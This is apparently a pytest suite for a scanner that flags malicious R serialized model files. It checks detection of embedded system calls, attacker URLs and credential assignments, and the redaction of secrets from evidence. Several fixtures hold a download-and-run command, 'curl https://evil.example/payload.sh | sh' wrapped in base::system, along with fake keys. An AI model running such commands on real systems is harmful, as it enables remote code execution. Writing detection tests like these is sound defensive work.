from __future__ import annotations

import gzip
import lzma
import zipfile
from pathlib import Path
from unittest.mock import patch

import pytest

from modelaudit import core
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners import r_serialized_scanner as r_scanner_module
from modelaudit.scanners._evidence_redaction import REDACTED_EVIDENCE_VALUE, _r_non_code_spans
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
from modelaudit.utils.file.detection import (
    detect_file_format,
    detect_file_format_for_skip_filter,
    detect_format_from_extension,
)


def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
    prefix = "RDX2\nX\n" if workspace_header else "X\n"
    path.write_bytes((prefix + body).encode("utf-8"))


def _write_raw_r_serialized_bytes(path: Path, body: bytes, *, workspace_header: bool = False) -> None:
    prefix = b"RDX2\nX\n" if workspace_header else b"X\n"
    path.write_bytes(prefix + body)


def _write_gzip_r_serialized(path: Path, body: str, *, workspace_header: bool = True) -> None:
    payload_prefix = "RDX2\nX\n" if workspace_header else "X\n"
    with gzip.open(path, "wb") as stream:
        stream.write((payload_prefix + body).encode("utf-8"))


def _write_xz_r_serialized(path: Path, body: str, *, dict_size: int) -> None:
    payload = ("X\n" + body).encode("utf-8")
    compressed = lzma.compress(
        payload,
        format=lzma.FORMAT_XZ,
        filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
    )
    path.write_bytes(compressed)


def _write_concatenated_xz_r_serialized(path: Path, bodies: list[str], *, dict_size: int) -> None:
    compressed_parts = [
        lzma.compress(
            ("X\n" + body).encode("utf-8"),
            format=lzma.FORMAT_XZ,
            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
        )
        for body in bodies
    ]
    path.write_bytes(b"".join(compressed_parts))


def _check_by_name(result: ScanResult, name: str) -> list[Check]:
    return [check for check in result.checks if check.name == name]


def test_can_handle_raw_rds_signature(tmp_path: Path) -> None:
    path = tmp_path / "safe.rds"
    _write_raw_r_serialized(path, "model\nlm\ncoefficients")

    assert RSerializedScanner.can_handle(str(path))


def test_can_handle_compressed_rdata_signature(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rdata"
    _write_gzip_r_serialized(path, "workspace\nmodel_a\nmodel_b")

    assert RSerializedScanner.can_handle(str(path))


def test_wrong_extension_with_no_signature_is_not_handled(tmp_path: Path) -> None:
    path = tmp_path / "payload.bin"
    path.write_bytes(b"not-an-r-serialized-object")

    assert not RSerializedScanner.can_handle(str(path))


def test_unavailable_declared_r_serialized_file_retains_owner_for_operational_result(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unavailable.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")

    def raise_read_error(*_args: object, **_kwargs: object) -> None:
        raise PermissionError(13, "simulated unavailable R payload")

    monkeypatch.setattr("modelaudit.scanners.r_serialized_scanner.open", raise_read_error, raising=False)

    scanner = get_scanner_for_file(str(path))

    assert scanner is not None
    assert scanner.name == "r_serialized"
    result = scanner.scan(str(path))
    assert result.metadata["operational_error_reason"] == "r_serialized_read_failed"


def test_scan_benign_rds_model_does_not_raise_critical(tmp_path: Path) -> None:
    path = tmp_path / "benign.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "model",
                "glm",
                "feature_systematic_score",
                "evaluation_metric",
                "parse_date_feature",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    assert all(check.severity != IssueSeverity.CRITICAL for check in result.checks)

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_bounded_r_serialized_payload_is_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "bounded.rds"
    _write_raw_r_serialized(path, "safe\n" * 64)

    result = RSerializedScanner(config={"r_max_scan_bytes": 32}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_byte_ceiling_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_read_failure_is_operationally_inconclusive_and_not_cached(tmp_path: Path) -> None:
    path = tmp_path / "read-failure.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with patch.object(
            RSerializedScanner,
            "_read_payload_for_analysis",
            side_effect=PermissionError(13, "simulated R payload read failure"),
        ):
            direct = RSerializedScanner().scan(str(path))
            first = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            second = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

        assert direct.success is False
        assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
        assert all(check.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
        read_check = _check_by_name(direct, "R Serialized Read")[0]
        assert read_check.details["analysis_incomplete"] is True
        assert read_check.details["scan_outcome_reason"] == "r_serialized_read_failed"

        for aggregate in (first, second):
            metadata = next(iter(aggregate.file_metadata.values()))
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
            assert metadata["operational_error_reason"] == "r_serialized_read_failed"
            assert core.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_read_failure_bypasses_stale_clean_cache(tmp_path: Path) -> None:
    path = tmp_path / "read-failure-after-cache.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")
    cache_dir = tmp_path / "cache"
    cache_config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        with patch(
            "modelaudit.utils.helpers.cache_decorator.should_bypass_cache_for_read_failure_aware_file",
            return_value=False,
        ):
            warm_result = core.scan_file(str(path), config=cache_config)

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        with patch.object(
            RSerializedScanner,
            "_read_payload_for_analysis",
            side_effect=PermissionError(13, "simulated R payload read failure after cache warm"),
        ):
            direct = core.scan_file(str(path), config=cache_config)
            aggregate = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

        assert direct.success is False
        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
        metadata = aggregate.file_metadata[str(path)]
        assert aggregate.success is False
        assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert metadata["operational_error_reason"] == "r_serialized_read_failed"
        assert core.determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_scan_renamed_read_failure_bypasses_stale_clean_cache(tmp_path: Path) -> None:
    path = tmp_path / "read-failure-after-cache.jpg"
    _write_raw_r_serialized(path, "safe\nmodel\nweights", workspace_header=True)
    cache_dir = tmp_path / "cache"
    cache_config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        with patch(
            "modelaudit.utils.helpers.cache_decorator.should_bypass_cache_for_read_failure_aware_file",
            return_value=False,
        ):
            warm_result = core.scan_file(str(path), config=cache_config)

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        with patch.object(
            RSerializedScanner,
            "_read_payload_for_analysis",
            side_effect=PermissionError(13, "simulated renamed R payload read failure after cache warm"),
        ):
            direct = core.scan_file(str(path), config=cache_config)
            aggregate = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

        assert direct.success is False
        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
        metadata = aggregate.file_metadata[str(path)]
        assert aggregate.success is False
        assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert metadata["operational_error_reason"] == "r_serialized_read_failed"
        assert core.determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_scan_unreadable_path_is_operationally_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")
    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda *_args: False)

    direct = RSerializedScanner().scan(str(path))
    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    assert direct.success is False
    assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
    assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
    metadata = aggregate.file_metadata[str(path)]
    assert metadata["operational_error_reason"] == "r_serialized_read_failed"
    assert core.determine_exit_code(aggregate) == 2


def test_scan_string_extraction_ceiling_reports_incomplete_late_payload_analysis(tmp_path: Path) -> None:
    path = tmp_path / "late-payload.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "feature_000",
                "feature_001",
                "feature_002",
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh | sh')",
            ]
        ),
    )

    full_result = RSerializedScanner(config={"r_max_extracted_strings": 100}).scan(str(path))
    limited_result = RSerializedScanner(config={"r_max_extracted_strings": 2}).scan(str(path))

    assert any(check.severity == IssueSeverity.CRITICAL for check in full_result.checks)
    assert limited_result.success is False
    assert limited_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_string_extraction_incomplete" in limited_result.metadata["scan_outcome_reasons"]
    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in limited_result.checks)
    ceiling_checks = _check_by_name(limited_result, "String Extraction Ceiling")
    assert len(ceiling_checks) == 1
    assert ceiling_checks[0].severity == IssueSeverity.INFO
    assert "configured extracted-string ceiling" in ceiling_checks[0].message
    assert ceiling_checks[0].details["analysis_incomplete"] is True
    assert ceiling_checks[0].details["scan_outcome_reason"] == "r_serialized_string_extraction_incomplete"


def test_scan_string_extraction_ceiling_is_exit2_and_not_cached(tmp_path: Path) -> None:
    path = tmp_path / "limited.rds"
    _write_raw_r_serialized(path, "feature_000\nfeature_001\nfeature_002\nfeature_003")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            r_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            r_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "r_serialized_string_extraction_incomplete" in metadata["scan_outcome_reasons"]
            assert core.determine_exit_code(aggregate) == 2
            assert not any(
                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_dense_text_payload_still_reports_stuffing_warning(tmp_path: Path) -> None:
    path = tmp_path / "dense.rds"
    _write_raw_r_serialized(path, "A" * 1_000_100)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].severity == IssueSeverity.WARNING
    assert "scan_outcome" not in result.metadata


def test_scan_oversized_contiguous_text_reports_stuffing_below_dense_threshold(tmp_path: Path) -> None:
    path = tmp_path / "oversized-string.rds"
    _write_raw_r_serialized(path, "A" * 9_000)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].severity == IssueSeverity.WARNING
    assert stuffing_checks[0].details["longest_string"] > 8_192
    assert "scan_outcome" not in result.metadata


def test_scan_whitespace_padding_does_not_report_payload_stuffing(tmp_path: Path) -> None:
    path = tmp_path / "whitespace-padding.rds"
    _write_raw_r_serialized(path, " " * 9_000)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].status == CheckStatus.PASSED
    assert stuffing_checks[0].details["longest_string"] == 0
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_short_text_with_trailing_padding_does_not_report_payload_stuffing(tmp_path: Path) -> None:
    payload = "model" + (" " * 9_000)
    direct_path = tmp_path / "padding.rds"
    renamed_workspace = tmp_path / "padding.jpg"
    _write_raw_r_serialized(direct_path, payload)
    _write_raw_r_serialized(renamed_workspace, payload, workspace_header=True)

    direct = RSerializedScanner().scan(str(direct_path))
    renamed = core.scan_file(str(renamed_workspace), config={"cache_enabled": False})
    aggregate = core.scan_model_directory_or_file(str(renamed_workspace), cache_enabled=False)

    for result in (direct, renamed):
        stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
        assert len(stuffing_checks) == 1
        assert stuffing_checks[0].status == CheckStatus.PASSED
        assert stuffing_checks[0].details["longest_string"] == len("model")
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert renamed.scanner_name == "r_serialized"
    assert core.determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "body",
    [
        'function(token = "standard") if\n(TRUE) NULL',
        'function(token = r"(standard)") if (TRUE)\n# body follows\nNULL',
        'function(token = "standard")\n# café\nNULL',
        '\\\n(token = "standard") NULL',
    ],
)
def test_scan_joins_function_expressions_split_across_printable_runs(tmp_path: Path, body: str) -> None:
    path = tmp_path / "split-function-control-body.rds"
    _write_raw_r_serialized(path, body)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


def test_scan_invalid_utf8_comment_gap_does_not_suppress_credential_detection(tmp_path: Path) -> None:
    path = tmp_path / "invalid-utf8-comment-gap.rds"
    _write_raw_r_serialized_bytes(
        path,
        b'function(token = "INVALID_UTF8_SECRET")\n# caf\xff\nNULL',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_detects_executable_call_split_at_printable_chunk_boundary(tmp_path: Path) -> None:
    path = tmp_path / "split-system-call.rds"
    _write_raw_r_serialized(path, "A" * 503 + "base::system('id')")

    direct = RSerializedScanner().scan(str(path))
    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    symbol_checks = _check_by_name(direct, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    assert core.determine_exit_code(aggregate) == 1


def test_scan_preserves_short_printable_tail_at_chunk_boundary(tmp_path: Path) -> None:
    path = tmp_path / "split-system-call-tail.rds"
    _write_raw_r_serialized_bytes(path, b"A" * 500 + b"base::system(\x00'id')")

    direct = RSerializedScanner().scan(str(path))
    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    symbol_checks = _check_by_name(direct, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    assert core.determine_exit_code(aggregate) == 1


def test_scan_benign_rdata_workspace_passes_signature_and_context_checks(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rda"
    _write_raw_r_serialized(path, "workspace\nmodel_one\nmodel_two", workspace_header=True)

    result = RSerializedScanner().scan(str(path))

    signature_checks = _check_by_name(result, "R Serialization Signature")
    assert len(signature_checks) == 1
    assert signature_checks[0].status == CheckStatus.PASSED

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.PASSED


def test_scan_detects_malicious_expression_and_bypass_noise(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rdata"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh # harmless comment | sh')",
                "AKIAABCDEFGHIJKLMNOP",
            ]
        ),
        workspace_header=True,
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                (
                    "base::system('curl "
                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT | sh')"
                ),
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    details = network_checks[0].details
    assert details["urls"] == ["https://evil.example/payload.sh"]
    assert "user" not in str(details)
    assert "pass" not in str(details)
    assert "SECRET_TOKEN" not in str(details)
    assert "SECRET_FRAGMENT" not in str(details)


def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
    path = tmp_path / "sample-leak.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                (
                    "base::system('curl "
                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT "
                    "| sh; token <- \"R_TOKEN_123456\"; password <<- 'R_PASS_123456'; "
                    "Authorization: Bearer ABCDEFGHIJKLMNOP')"
                ),
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    samples = [
        symbol_checks[0].details["examples"][0]["sample"],
        payload_checks[0].details["examples"][0]["sample"],
    ]

    for sample in samples:
        assert "base::system" in sample
        assert "curl" in sample
        assert "evil.example/payload.sh" in sample
        assert "<redacted>" in sample
        assert "user:pass" not in sample
        assert "SECRET_TOKEN" not in sample
        assert "SECRET_FRAGMENT" not in sample
        assert "R_TOKEN_123456" not in sample
        assert "R_PASS_123456" not in sample
        assert "ABCDEFGHIJKLMNOP" not in sample


def test_scan_redacts_rightward_assignment_payload_samples(tmp_path: Path) -> None:
    path = tmp_path / "rightward-sample-leak.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                "base::system('curl'); 'R_TOKEN_RIGHTWARD' -> token; "
                + '"R_PASS_RIGHTWARD" ->> password; R_BARE_RIGHTWARD -> access_token',
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    samples = [
        symbol_checks[0].details["examples"][0]["sample"],
        payload_checks[0].details["examples"][0]["sample"],
    ]

    for sample in samples:
        assert "base::system" in sample
        assert "curl" in sample
        assert "<redacted>" in sample
        assert "R_TOKEN_RIGHTWARD" not in sample
        assert "R_PASS_RIGHTWARD" not in sample
        assert "R_BARE_RIGHTWARD" not in sample


def test_scan_redacts_and_detects_rightward_assignment_expressions(tmp_path: Path) -> None:
    path = tmp_path / "rightward-expression-sample-leak.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); paste("PREFIX;RIGHTWARD_SECRET", collapse=";") -> token',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert 'base::system("curl")' in sample
    assert "<redacted> -> token" in sample
    assert "PREFIX" not in sample
    assert "RIGHTWARD_SECRET" not in sample


def test_scan_redacts_and_detects_leftward_assignment_expressions(tmp_path: Path) -> None:
    path = tmp_path / "leftward-expression-sample-leak.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- paste0("LEFTWARD_SECRET", "TAIL")',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert 'base::system("curl")' in sample
    assert f"token <- {REDACTED_EVIDENCE_VALUE}" in sample
    assert "LEFTWARD_SECRET" not in sample
    assert "TAIL" not in sample


@pytest.mark.parametrize(
    ("assignment", "secret"),
    [
        (r'token <- "ABC\"ESCAPED_SECRET"', "ESCAPED_SECRET"),
        ('`access-token` <- "BACKTICK_LEFT_SECRET"', "BACKTICK_LEFT_SECRET"),
        ('"BACKTICK_RIGHT_SECRET" -> `client-secret`', "BACKTICK_RIGHT_SECRET"),
        ('`access token` <- "SPACED_BACKTICK_SECRET"', "SPACED_BACKTICK_SECRET"),
        ('`access token` = "BACKTICK_EQUALS_SECRET"', "BACKTICK_EQUALS_SECRET"),
        ('api.key <- "DOT_LEFT_SECRET"', "DOT_LEFT_SECRET"),
        ('"DOT_RIGHT_SECRET" -> access.token', "DOT_RIGHT_SECRET"),
        ('dbPassword <- "CAMEL_PASSWORD_SECRET"', "CAMEL_PASSWORD_SECRET"),
        ('sessionToken <<- "CAMEL_TOKEN_SECRET"', "CAMEL_TOKEN_SECRET"),
        ('`dbPassword` <- "BACKTICK_CAMEL_SECRET"', "BACKTICK_CAMEL_SECRET"),
        ('token[1] <- "INDEXED_TOKEN_SECRET"', "INDEXED_TOKEN_SECRET"),
        ('config$token <- "MEMBER_TOKEN_SECRET"', "MEMBER_TOKEN_SECRET"),
        ('config@password <- "SLOT_PASSWORD_SECRET"', "SLOT_PASSWORD_SECRET"),
        ('config[["api_key"]] <- "SUBSCRIPT_API_SECRET"', "SUBSCRIPT_API_SECRET"),
        ('"RIGHT_MEMBER_SECRET" -> config$token', "RIGHT_MEMBER_SECRET"),
        ('pwd <- "PWD_SECRET_VALUE"', "PWD_SECRET_VALUE"),
        ('token <- r"(RAW_LEFT_SECRET)"', "RAW_LEFT_SECRET"),
        ('token = r"(RAW_EQUALS_SECRET)"', "RAW_EQUALS_SECRET"),
        ('R"---{RAW_RIGHT_SECRET}---" -> client.secret', "RAW_RIGHT_SECRET"),
        ('refresh.token <- r"[raw values may contain \\"quotes\\" and ; delimiters]"', "raw values may contain"),
        ('token <- r"(UNTERMINATED_RAW_SECRET', "UNTERMINATED_RAW_SECRET"),
        ('"access token" <- "QUOTED_NAME_SECRET"', "QUOTED_NAME_SECRET"),
        ("r\"(QUOTED_RAW_SECRET)\" -> 'client.secret'", "QUOTED_RAW_SECRET"),
    ],
)
def test_scan_redacts_complex_r_assignment_payload_samples(tmp_path: Path, assignment: str, secret: str) -> None:
    path = tmp_path / "complex-assignment-sample-leak.rds"
    _write_raw_r_serialized(path, f"expression\nlanguage\nbase::system('curl'); {assignment}")

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    samples = [
        symbol_checks[0].details["examples"][0]["sample"],
        payload_checks[0].details["examples"][0]["sample"],
    ]

    for sample in samples:
        assert "<redacted>" in sample
        assert secret not in sample


@pytest.mark.parametrize(
    "assignment",
    [
        "token <- 'LEFTWARD_SECRET'",
        "password <<- 'GLOBAL_LEFT_SECRET'",
        "'RIGHTWARD_SECRET' -> token",
        "'GLOBAL_RIGHT_SECRET' ->> password",
        "access_token <- 'COMPOUND_LEFT_SECRET'",
        "'COMPOUND_RIGHT_SECRET' -> client_secret",
        "`access-token` <- 'BACKTICK_LEFT_SECRET'",
        "'BACKTICK_RIGHT_SECRET' -> `refresh-token`",
        "`api key` <- 'SPACED_BACKTICK_SECRET'",
        '`access token` = "BACKTICK_EQUALS_SECRET"',
        r'token <- "ABC\"ESCAPED_SECRET"',
        "api.key <- 'DOT_LEFT_SECRET'",
        "'DOT_RIGHT_SECRET' -> access.token",
        "dbPassword <- 'CAMEL_PASSWORD_SECRET'",
        "sessionToken <<- 'CAMEL_TOKEN_SECRET'",
        "`dbPassword` <- 'BACKTICK_CAMEL_SECRET'",
        "token[1] <- 'INDEXED_TOKEN_SECRET'",
        "config$token <- 'MEMBER_TOKEN_SECRET'",
        "config@password <- 'SLOT_PASSWORD_SECRET'",
        'config[["api_key"]] <- "SUBSCRIPT_API_SECRET"',
        "'RIGHT_MEMBER_SECRET' -> config$token",
        "pwd <- 'PWD_SECRET_VALUE'",
        'token <- r"(RAW_LEFT_SECRET)"',
        'token = r"(RAW_EQUALS_SECRET)"',
        'R"---{RAW_RIGHT_SECRET}---" -> client.secret',
        'refresh.token <- r"[raw values may contain \\"quotes\\" and ; delimiters]"',
        '"access token" <- "QUOTED_NAME_SECRET"',
        "r\"(QUOTED_RAW_SECRET)\" -> 'client.secret'",
    ],
)
def test_scan_detects_native_r_credential_assignments(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "native-credential-assignment.rds"
    _write_raw_r_serialized(path, assignment)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    assert credential_checks[0].details["pattern_classes"] == ["generic_secret_assignment"]


def test_scan_redacts_unterminated_raw_assignment_without_credential_false_positive(tmp_path: Path) -> None:
    path = tmp_path / "unterminated-raw-assignment.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- r"(UNTERMINATED_RAW_SECRET',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "UNTERMINATED_RAW_SECRET" not in sample
    assert sample.endswith("token <- <redacted>")


def test_scan_recovers_after_malformed_raw_prefix(tmp_path: Path) -> None:
    path = tmp_path / "malformed-prefix-before-credential.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); r"{BROKEN_PREFIX; token <- r"(LATER_RAW_SECRET)"',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "LATER_RAW_SECRET" not in sample
    assert sample.endswith("token <- <redacted>")


@pytest.mark.parametrize(
    "assignment",
    [
        'token <- r"(MULTILINE_RAW_SECRET\ncurl payload)"',
        'token <- "MULTILINE_QUOTED_SECRET\ncurl payload"',
    ],
)
def test_scan_detects_and_redacts_multiline_credential_assignments(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "multiline-credential-assignment.rds"
    _write_raw_r_serialized(
        path,
        f'expression\nlanguage\nbase::system("curl"); {assignment}',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "<redacted>" in sample
